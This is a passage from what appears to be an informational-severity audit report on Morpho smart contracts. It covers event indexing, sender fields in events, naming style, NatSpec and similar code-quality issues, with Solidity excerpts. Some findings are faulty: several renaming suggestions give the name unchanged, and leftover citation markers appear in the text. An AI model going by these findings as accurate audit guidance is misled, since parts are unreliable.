[22](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/PermitBundler.sol#L22-L26)

```solidity
📁 File: morpho-blue-bundlers/src/ethereum/EthereumPermitBundler.sol

/// @audit r
/// @audit s
24:     function permitDai(uint256 nonce, uint256 expiry, bool allowed, uint8 v, bytes32 r, bytes32 s, bool skipRevert) 
25:         external
26:         payable
27:         protected
28:     {
```
[24](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/EthereumPermitBundler.sol#L24-L28)

```solidity
📁 File: morpho-blue-bundlers/src/migration/CompoundV3MigrationBundler.sol

/// @audit r
/// @audit s
74:     function compoundV3AllowBySig( 
75:         address instance,
76:         bool isAllowed,
77:         uint256 nonce,
78:         uint256 expiry,
79:         uint8 v,
80:         bytes32 r,
81:         bytes32 s,
82:         bool skipRevert
83:     ) external payable protected {
```
[74](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV3MigrationBundler.sol#L74-L83)

```solidity
📁 File: universal-rewards-distributor/src/UniversalRewardsDistributor.sol

/// @audit initialRoot
/// @audit initialIpfsHash
68:     constructor(address initialOwner, uint256 initialTimelock, bytes32 initialRoot, bytes32 initialIpfsHash) { 

/// @audit newRoot
/// @audit newIpfsHash
80:     function submitRoot(bytes32 newRoot, bytes32 newIpfsHash) external onlyUpdaterRole { 

/// @audit newRoot
/// @audit newIpfsHash
143:     function setRoot(bytes32 newRoot, bytes32 newIpfsHash) external onlyUpdaterRole { 

/// @audit newRoot
/// @audit newIpfsHash
183:     function _setRoot(bytes32 newRoot, bytes32 newIpfsHash) internal { 
```
[68](https://github.com/morpho-org/universal-rewards-distributor/blob/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L68-L68), [80](https://github.com/morpho-org/universal-rewards-distributor/blob/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L80-L80), [143](https://github.com/morpho-org/universal-rewards-distributor/blob/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L143-L143), [183](https://github.com/morpho-org/universal-rewards-distributor/blob/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L183-L183)

```solidity
📁 File: universal-rewards-distributor/src/UrdFactory.sol

/// @audit initialRoot
/// @audit initialIpfsHash
/// @audit salt
26:     function createUrd( 
27:         address initialOwner,
28:         uint256 initialTimelock,
29:         bytes32 initialRoot,
30:         bytes32 initialIpfsHash,
31:         bytes32 salt
32:     ) public returns (UniversalRewardsDistributor urd) {
```
[26](https://github.com/morpho-org/universal-rewards-distributor/blob/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UrdFactory.sol#L26-L32)

</details>

- Recommendation Migration Steps
Add checks to ensure byte parameters are not empty before they are processed in the function. This can be achieved using conditionals that revert or throw an error if the byte array is empty.



### Event is missing indexed fields

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Description
In the current codebase of `Metamorpho and Periphery`, several event declarations lack indexed fields. Indexing fields in events significantly enhances the efficiency of off-chain tools that parse these events. While each indexed field incurs additional gas costs during emission, it is often advantageous for facilitating data access and queries, particularly when dealing with multiple or complex events.

- Instances
<details>

```solidity
📁 File: metamorpho/src/libraries/EventsLib.sol

14:     event SubmitTimelock(uint256 newTimelock); 

17:     event SetTimelock(address indexed caller, uint256 newTimelock); 

23:     event SetFee(address indexed caller, uint256 newFee); 

35:     event SubmitCap(address indexed caller, Id indexed id, uint256 cap); 

38:     event SetCap(address indexed caller, Id indexed id, uint256 cap); 

41:     event UpdateLastTotalAssets(uint256 updatedTotalAssets); 

50:     event SetIsAllocator(address indexed allocator, bool isAllocator); 

65:     event SetSupplyQueue(address indexed caller, Id[] newSupplyQueue); 

68:     event SetWithdrawQueue(address indexed caller, Id[] newWithdrawQueue); 

74:     event ReallocateSupply(address indexed caller, Id indexed id, uint256 suppliedAssets, uint256 suppliedShares); 

80:     event ReallocateWithdraw(address indexed caller, Id indexed id, uint256 withdrawnAssets, uint256 withdrawnShares); 

85:     event AccrueInterest(uint256 newTotalAssets, uint256 feeShares); 

88:     event Skim(address indexed caller, address indexed token, uint256 amount); 
```
[14](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L14-L14), [17](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L17-L17), [23](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L23-L23), [35](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L35-L35), [38](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L38-L38), [41](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L41-L41), [50](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L50-L50), [65](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L65-L65), [68](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L68-L68), [74](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L74-L74), [80](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L80-L80), [85](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L85-L85), [88](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L88-L88)

```solidity
📁 File: morpho-blue-irm/src/AdaptiveCurveIrm.sol

28:     event BorrowRateUpdate(Id indexed id, uint256 avgBorrowRate, uint256 rateAtTarget); 
```
[28](https://github.com/morpho-org/morpho-blue-irm/blob/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L28-L28)

```solidity
📁 File: universal-rewards-distributor/src/libraries/EventsLib.sol

25:     event TimelockSet(uint256 newTimelock); 

30:     event RootUpdaterSet(address indexed rootUpdater, bool active); 

36:     event Claimed(address indexed account, address indexed reward, uint256 amount); 
```
[25](https://github.com/morpho-org/universal-rewards-distributor/blob/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/libraries/EventsLib.sol#L25-L25), [30](https://github.com/morpho-org/universal-rewards-distributor/blob/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/libraries/EventsLib.sol#L30-L30), [36](https://github.com/morpho-org/universal-rewards-distributor/blob/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/libraries/EventsLib.sol#L36-L36)

</details>

- Recommendation Migration Steps
**Review and Update Event Indexing**: Assess each event to determine which fields should be indexed. Ideally, up to three fields per event should be indexed, especially when they are critical for filtering or querying event data.

**Benefits of Implementation**
Indexed fields in events make it easier for off-chain applications to filter and access specific event data.



### Events are missing sender information

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Description
When an action is triggered based on a user's action, not being able to filter based on who triggered the action makes event processing a lot more cumbersome. Including the msg.sender the events of these types of action will make events much more useful to end users, especially when `msg.sender` is not `tx.origin`.


```solidity
📁 File: morpho-blue-irm/src/AdaptiveCurveIrm.sol

100:     function borrowRate(MarketParams memory marketParams, Market memory market) external returns (uint256) { 
101:         require(msg.sender == MORPHO, ErrorsLib.NOT_MORPHO);
102: 
103:         Id id = marketParams.id();
104: 
105:         (uint256 avgRate, int256 endRateAtTarget) = _borrowRate(id, market);
106: 
107:         rateAtTarget[id] = endRateAtTarget;
108: 
109:         // Safe "unchecked" cast because endRateAtTarget >= 0.
110:         emit BorrowRateUpdate(id, avgRate, uint256(endRateAtTarget));
111: 
112:         return avgRate;
113:     }
```
[100](https://github.com/morpho-org/morpho-blue-irm/blob/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L100-L113)


- Recommendation
Add `msg.sender` parameter in event-emit



### Events should be emitted before external calls	_(duplicate of [Events should be emitted before external calls])_

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Description
In the current codebase of `Metamorpho and Periphery`, there are instances where events are emitted after external calls, contrary to the recommended practice of the check-effects-interaction pattern. Emitting events before making external calls is critical for ensuring contract state is logged before interacting with external contracts, which enhances security and predictability.

- Instances
<details>

```solidity
📁 File: metamorpho/src/MetaMorpho.sol

/// @audit lastUpdate() on line 289
302:             emit EventsLib.SubmitCap(_msgSender(), id, newSupplyCap); 

/// @audit supplyShares() on line 370
384:         emit EventsLib.SetWithdrawQueue(_msgSender(), newWithdrawQueue); 

/// @audit withdraw() on line 418
420:                 emit EventsLib.ReallocateWithdraw(_msgSender(), id, withdrawnAssets, withdrawnShares); 

/// @audit supply() on line 437
439:                 emit EventsLib.ReallocateSupply(_msgSender(), id, suppliedAssets, suppliedShares); 

/// @audit safeTransfer() on line 518
520:         emit EventsLib.Skim(_msgSender(), token, amount); 
```
[302](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L302-L302), [384](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L384-L384), [420](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L420-L420), [439](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L439-L439), [520](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L520-L520)

```solidity
📁 File: universal-rewards-distributor/src/UniversalRewardsDistributor.sol

/// @audit safeTransfer() on line 133
135:         emit EventsLib.Claimed(account, reward, amount); 
```
[135](https://github.com/morpho-org/universal-rewards-distributor/blob/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L135-L135)

</details>

- Recommendation
Refactor the code to ensure events are emitted before any external calls. This aligns with the check-effects-interaction pattern, enhancing contract security.



### Events that mark critical parameter changes should contain both the old and the new value	_(duplicate of [Events that mark critical parameter changes should contain both the old and the new value])_

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Description
In the current codebase of `Metamorpho and Periphery`, there are several instances where events marking critical parameter changes only include the new value, omitting the old value. Including both old and new values in such events is essential for tracking changes effectively, especially when the new value is not required to be different from the old one.

- Instances
<details>

```solidity
📁 File: metamorpho/src/MetaMorpho.sol

186:     function setCurator(address newCurator) external onlyOwner { 
187:         if (newCurator == curator) revert ErrorsLib.AlreadySet();
188: 
189:         curator = newCurator;
190: 
191:         emit EventsLib.SetCurator(newCurator);
192:     }

204:     function setSkimRecipient(address newSkimRecipient) external onlyOwner { 
205:         if (newSkimRecipient == skimRecipient) revert ErrorsLib.AlreadySet();
206: 
207:         skimRecipient = newSkimRecipient;
208: 
209:         emit EventsLib.SetSkimRecipient(newSkimRecipient);
210:     }

233:     function setFee(uint256 newFee) external onlyOwner { 
234:         if (newFee == fee) revert ErrorsLib.AlreadySet();
235:         if (newFee > ConstantsLib.MAX_FEE) revert ErrorsLib.MaxFeeExceeded();
236:         if (newFee != 0 && feeRecipient == address(0)) revert ErrorsLib.ZeroFeeRecipient();
237: 
238:         // Accrue interest using the previous fee set before changing it.
239:         _updateLastTotalAssets(_accrueFee());
240: 
241:         // Safe "unchecked" cast because newFee <= MAX_FEE.
242:         fee = uint96(newFee);
243: 
244:         emit EventsLib.SetFee(_msgSender(), fee);
245:     }

248:     function setFeeRecipient(address newFeeRecipient) external onlyOwner { 
249:         if (newFeeRecipient == feeRecipient) revert ErrorsLib.AlreadySet();
250:         if (newFeeRecipient == address(0) && fee != 0) revert ErrorsLib.ZeroFeeRecipient();
251: 
252:         // Accrue interest to the previous fee recipient set before changing it.
253:         _updateLastTotalAssets(_accrueFee());
254: 
255:         feeRecipient = newFeeRecipient;
256: 
257:         emit EventsLib.SetFeeRecipient(newFeeRecipient);
258:     }

325:     function setSupplyQueue(Id[] calldata newSupplyQueue) external onlyAllocatorRole { 
326:         uint256 length = newSupplyQueue.length;
327: 
328:         if (length > ConstantsLib.MAX_QUEUE_LENGTH) revert ErrorsLib.MaxQueueLengthExceeded();
329: 
330:         for (uint256 i; i < length; ++i) {
331:             if (config[newSupplyQueue[i]].cap == 0) revert ErrorsLib.UnauthorizedMarket(newSupplyQueue[i]);
332:         }
333: 
334:         supplyQueue = newSupplyQueue;
335: 
336:         emit EventsLib.SetSupplyQueue(_msgSender(), newSupplyQueue);
337:     }

748:     function _setTimelock(uint256 newTimelock) internal { 
749:         timelock = newTimelock;
750: 
751:         emit EventsLib.SetTimelock(_msgSender(), newTimelock);
752: 
753:         delete pendingTimelock;
754:     }

757:     function _setGuardian(address newGuardian) internal { 
758:         guardian = newGuardian;
759: 
760:         emit EventsLib.SetGuardian(_msgSender(), newGuardian);
761: 
762:         delete pendingGuardian;
763:     }

895:     function _updateLastTotalAssets(uint256 updatedTotalAssets) internal { 
896:         lastTotalAssets = updatedTotalAssets;
897: 
898:         emit EventsLib.UpdateLastTotalAssets(updatedTotalAssets);
899:     }
```
[186](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L186-L192), [204](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L204-L210), [233](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L233-L245), [248](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L248-L258), [325](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L325-L337), [748](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L748-L754), [757](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L757-L763), [895](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L895-L899)

```solidity
📁 File: universal-rewards-distributor/src/UniversalRewardsDistributor.sol

193:     function _setOwner(address newOwner) internal { 
194:         owner = newOwner;
195: 
196:         emit EventsLib.OwnerSet(newOwner);
197:     }

200:     function _setTimelock(uint256 newTimelock) internal { 
201:         timelock = newTimelock;
202: 
203:         emit EventsLib.TimelockSet(newTimelock);
204:     }
```
[193](https://github.com/morpho-org/universal-rewards-distributor/blob/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L193-L197), [200](https://github.com/morpho-org/universal-rewards-distributor/blob/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L200-L204)

</details>

- Recommendation
Update the event declarations to include both the old and new values of the parameters being changed. This modification provides a complete picture of the changes being made.



### Functions should be named in mixedCase style

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Description
In Solidity, adherence to the [official style guide](https://docs.soliditylang.org/en/latest/style-guide.html#function-names) is crucial for readability and maintainability. Specifically, function names should follow the `mixedCase` (lowerCamelCase) format. Exceptions are allowed for `private`/`internal` functions, where an underscore `_` prefix is permissible.

- Specific Instances
1. **Contract: `IMetaMorpho.sol`**
   - Function: `MORPHO()` should be renamed to follow mixedCase style【33†source】.

2. **Contract: `IWstEth.sol`**
   - Functions:
     - `DOMAIN_SEPARATOR()` should be `domainSeparator()`【5†source】.
     - `getStETHByWstETH()` and `getWstETHByStETH()` are correctly named【12†source】.
     - `stETH()` should be `stEth()`【19†source】.

3. **Contract: `IAaveV2.sol`**
   - Function: `FLASHLOAN_PREMIUM_TOTAL()` should be `flashloanPremiumTotal()`【260†source】.

4. **Contract: `IAaveV3.sol`**
   - Functions:
     - `repayWithATokens()` should be `repayWithATokens()`【209†source】.
     - `ADDRESSES_PROVIDER()` should be `addressesProvider()`【426†source】.
     - `setUserEMode()` is correctly named【450†source】.
     - `getUserEMode()` should be `getUserEMode()`【457†source】.
     - `MAX_STABLE_RATE_BORROW_SIZE_PERCENT()` should be `maxStableRateBorrowSizePercent()`【470†source】.
     - `FLASHLOAN_PREMIUM_TOTAL()` should be `flashloanPremiumTotal()`【476†source】.
     - `BRIDGE_PROTOCOL_FEE()` should be `bridgeProtocolFee()`【482†source】.
     - `FLASHLOAN_PREMIUM_TO_PROTOCOL()` should be `flashloanPremiumToProtocol()`【488†source】.
     - `MAX_NUMBER_RESERVES()` should be `maxNumberReserves()`【494†source】.

5. **Contract: `IAaveV3Optimizer.sol`**
   - Function: `DOMAIN_SEPARATOR()` should be `domainSeparator()`【26†source】.

- Recommended Mitigation Steps
- Refactor the function names to adhere to the `mixedCase` convention, ensuring clarity and consistency with the Solidity style guide.

**Benefits of Implementation**
- Compliance with the Solidity style guide improves the readability and maintainability of the code.



### Contract does not follow the Solidity style guide's suggested layout ordering

**Severity:** Informational

**Context:** [MetaMorpho.sol#L139-L139](metamorpho/src/MetaMorpho.sol#L139-L139), [MetaMorpho.sol#L147-L147](metamorpho/src/MetaMorpho.sol#L147-L147), [MetaMorpho.sol#L157-L157](metamorpho/src/MetaMorpho.sol#L157-L157), [MetaMorpho.sol#L164-L164](metamorpho/src/MetaMorpho.sol#L164-L164), [MetaMorpho.sol#L176-L176](metamorpho/src/MetaMorpho.sol#L176-L176), [AdaptiveCurveIrm.sol#L28-L28](morpho-blue-irm/src/AdaptiveCurveIrm.sol#L28-L28)

**Description:**

Maintaining a consistent and organized layout within a Solidity contract is crucial for code readability. According to the [Solidity style guide](https://docs.soliditylang.org/en/v0.8.16/style-guide.html#order-of-layout), the recommended order within a contract is as follows: 1) Type declarations, 2) State variables, 3) Events, 4) Modifiers, and 5) Functions. Adhering to this structure makes it easier for developers to locate specific elements within the code.

However, in the provided contract(s), the layout does not follow this recommended ordering, potentially affecting the code's clarity.

**Recommendation:**

To align with best practices and the Solidity style guide, consider reordering the elements within the contract. Specifically, move the modifier above the constructor to adhere to the suggested layout. This adjustment enhances the overall readability and maintainability of the code.



### if-statement can be converted to a ternary

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Description
The use of traditional `if-else` statements, while effective, can sometimes be replaced with ternary operators for improved compactness and readability, especially in cases where the logic is straightforward.

```solidity
📁 File: morpho-blue-bundlers/src/MorphoBundler.sol

109:         if (assets > 0) require(suppliedShares >= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED); 
110:         else require(suppliedAssets <= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);

159:         if (assets > 0) require(borrowedShares <= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED); 
160:         else require(borrowedAssets >= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);

193:         if (assets > 0) require(repaidShares >= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED); 
194:         else require(repaidAssets <= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);

218:         if (assets > 0) require(withdrawnShares <= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED); 
219:         else require(withdrawnAssets >= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);
```
**Contract: `MorphoBundler.sol`**
   - Instances:
     1. Lines [109-110](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L109-L110)
     2. Lines [159-160](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L159-L160)
     3. Lines [193-194](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L193-L194)
     4. Lines [218-219](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L218-L219)

- Recommendation Mitigation Steps
Replace the `if-else` statements with ternary operators. For example, the code snippet in lines [109-110](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L109-L110) can be rewritten as:

```solidity
require((assets > 0) ? (suppliedShares >= slippageAmount) : (suppliedAssets <= slippageAmount), ErrorsLib.SLIPPAGE_EXCEEDED);
```

This change can be applied similarly to the other identified instances.



### Inconsistent spacing in comments

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Description
Inconsistent comment spacing can reduce code readability and professionalism. The issue here is the varied use of spaces after the comment symbol (`//`). Some comments have a space (`// Comment`), while others do not (`//Comment`). Standardizing this across all files will improve overall code quality.

1. **Contract: `MetaMorpho.sol`** - Majority use no space. Instances with space: [View Line 1](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L1-L1) and [Lines 39-42](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L39-L42)
2. **Contract: `MetaMorphoFactory.sol`** - Majority use no space. Instances with space: [View Line 1](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorphoFactory.sol#L1-L1) and [Lines 9-12](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorphoFactory.sol#L9-L12)
3. **Contract: `IMetaMorpho.sol`** - Majority use space. Instances with no space: [View Line 1](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L1-L1) and [Lines 12-14](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L12-L14)
4. **Contract: `ConstantsLib.sol`** - Majority use space. Instances with no space: [View Line 1](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ConstantsLib.sol#L1-L1) and [Lines 4-7](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ConstantsLib.sol#L4-L7)
5. **Contract: `ErrorsLib.sol`** - Majority use space. Instances with no space: [View Line 1](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L1-L1) and [Lines 6-9](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/ErrorsLib.sol#L6-L9)
6. **Contract: `EventsLib.sol`** - Majority use space. Instances with no space: [View Line 1](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L1-L1) and [Lines 8-11](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/libraries/EventsLib.sol#L8-L11)
7. **Contract: `BaseBundler.sol`** - Majority use space. Instances with no space: [View Line 1](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L1-L1) and [Lines 10-17](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L10-L17)
8. **Contract: `ERC4626Bundler.sol`** - Majority use

- Recommendation 
Implement consistent spacing for comments



### NatSpec: Contract declarations should have @author, @dev, @notice and @title tags and NatSpec descriptions

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Description
NatSpec (Natural Language Specification) is an essential documentation standard in `Solidity Contracts`, used primarily for annotating smart contracts. It employs several tags to enhance understanding and clarity:

1. The `@author` tag is pivotal in contract declarations, identifying the contract's author or maintainer, thereby adding context and accountability.
2. The `@dev` tag provides in-depth technical insights into contracts or libraries, focusing on developer-centric details.
3. The `@notice` tag is used for explaining the purpose and functionality of contracts and interfaces, aimed at both end users and developers.
4. The `@title` tag offers a concise title for contracts or interfaces, aiding quick comprehension of their purpose.
5. It is recommended that Solidity contracts are fully annotated using NatSpec for all public interfaces (everything in the ABI). It is clearly stated in the Solidity official documentation. In complex projects such as DeFi, the interpretation of all functions and their arguments and returns is important for code readability and auditability.

- Instances
**Contracts/Interfcases missing `@author`, `@dev`, `@notice` and `@title` tags:**
<details>

```solidity
📁 File: metamorpho/src/interfaces/IMetaMorpho.sol

17:  
18: interface IMulticall {
19:     function multicall(bytes[] calldata) external returns (bytes[] memory);

21:  
22: interface IOwnable {
23:     function owner() external returns (address);

31: /// @dev Consider using the IMetaMorpho interface instead of this one. 
32: interface IMetaMorphoBase {
33:     function MORPHO() external view returns (IMorpho);

79: /// @dev Consider using the IMetaMorpho interface instead of this one. 
80: interface IMetaMorphoStaticTyping is IMetaMorphoBase {
81:     function config(Id) external view returns (uint184 cap, bool enabled, uint64 removableAt);
```
[17](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L17-L19), [21](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L21-L23), [31](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L31-L33), [79](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L79-L81)

```solidity
📁 File: metamorpho/src/interfaces/IMorphoMarketParams.sol

5:  
6: interface IMorphoMarketParams {
7:     function idToMarketParams(Id id) external view returns (MarketParams memory marketParams);
```
[5](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMorphoMarketParams.sol#L5-L7)

```solidity
📁 File: morpho-blue-bundlers/src/ethereum/interfaces/IDaiPermit.sol

3:  
4: interface IDaiPermit {
5:     /// @param holder The address of the token owner.
```
[3](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/interfaces/IDaiPermit.sol#L3-L5)

```solidity
📁 File: morpho-blue-bundlers/src/ethereum/libraries/MainnetLib.sol

3:  
4: library MainnetLib {
5:     /// @dev The address of the WETH contract on Ethereum.
```
[3](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/libraries/MainnetLib.sol#L3-L5)

```solidity
📁 File: morpho-blue-bundlers/src/interfaces/IStEth.sol

3:  
4: interface IStEth {
5:     function transferShares(address _recipient, uint256 _sharesAmount) external returns (uint256);
```
[3](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IStEth.sol#L3-L5)

```solidity
📁 File: morpho-blue-bundlers/src/interfaces/IWNative.sol

3:  
4: interface IWNative {
5:     function deposit() external payable;
```
[3](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWNative.sol#L3-L5)

```solidity
📁 File: morpho-blue-bundlers/src/interfaces/IWstEth.sol

3:  
4: interface IWstEth {
5:     function DOMAIN_SEPARATOR() external view returns (bytes32);
```
[3](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L3-L5)

```solidity
📁 File: morpho-blue-bundlers/src/migration/interfaces/IAaveV2.sol

42:  
43: interface IAaveV2 {
44:     /**
```
[42](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L42-L44)

```solidity
📁 File: morpho-blue-bundlers/src/migration/interfaces/IAaveV3.sol

60:  
61: interface IAaveV3 {
62:     /**
```
[60](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3.sol#L60-L62)

```solidity
📁 File: morpho-blue-bundlers/src/migration/interfaces/IAaveV3Optimizer.sol

22:  
23: interface IAaveV3Optimizer {
24:     error InvalidSignatory();
```
[22](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV3Optimizer.sol#L22-L24)

```solidity
📁 File: morpho-blue-bundlers/src/migration/interfaces/ICEth.sol

3:  
4: interface ICEth {
5:     function repayBorrowBehalf(address borrower) external payable;
```
[3](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L3-L5)

```solidity
📁 File: morpho-blue-bundlers/src/migration/interfaces/ICToken.sol

3:  
4: interface ICToken {
5:     function underlying() external returns (address);
```
[3](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L3-L5)

```solidity
📁 File: morpho-blue-bundlers/src/migration/interfaces/IComptroller.sol

3:  
4: interface IComptroller {
5:     function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
```
